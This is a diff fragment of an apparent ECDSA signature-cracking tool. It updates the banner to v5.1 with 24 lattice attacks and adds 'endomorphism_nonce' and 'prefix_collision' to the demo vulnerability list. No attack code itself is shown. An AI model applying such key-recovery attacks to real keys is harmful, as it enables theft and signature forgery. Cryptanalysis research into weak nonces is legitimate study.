@@ -2219,8 +2992,8 @@ Examples:
         num_workers = min(cores, 4)
 
     print("=" * 70)
-    print(" ADVANCED LATTICE CRACKER v5.0 — PARALLEL PROCESSING")
-    print(f" 18 attacks | 8GB RAM Safe | MAX_SIGS={MAX_SIGS} | Workers={num_workers}")
+    print(" ADVANCED LATTICE CRACKER v5.1 — PARALLEL PROCESSING")
+    print(f" 24 attacks | 8GB RAM Safe | MAX_SIGS={MAX_SIGS} | Workers={num_workers}")
     print(f" CPU Cores Detected: {cores} | Using: {num_workers}")
     if SKIP_GCD:
         print(f" FLAGS: -gcd (GCD + LCG attacks disabled)")
@@ -2232,7 +3005,8 @@ Examples:
 
     # ════════════════ DEMO MODE ═══════════════════════════════════════
     if args.demo:
-        vuln_types = ["nonce_reuse", "linear_polynonce", "msb_leak", "small_nonce", "lcg_nonce"]
+        vuln_types = ["nonce_reuse", "linear_polynonce", "msb_leak", "small_nonce", "lcg_nonce",
+                      "endomorphism_nonce", "prefix_collision"]
         if args.vuln and args.vuln != "all":
             vuln_types = [args.vuln]
 
